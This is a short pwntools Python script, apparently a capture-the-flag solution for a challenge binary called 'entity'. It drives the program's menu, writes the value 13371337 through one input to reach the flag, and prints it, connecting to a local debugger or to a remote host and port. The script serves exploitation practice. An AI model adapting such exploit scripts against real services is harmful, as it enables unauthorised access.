#!/usr/bin/env python3


from pwn import *
import sys


def exploit(io):
    io.sendlineafter(b">> ", b"T")
    io.sendlineafter(b">> ", b"S")
    io.sendlineafter(b">> ", p64(13371337)) 
    io.sendlineafter(b">> ", b"C")
    flag = io.recv().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./entity")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    
    exploit(io)

if __name__ == "__main__":
    main()
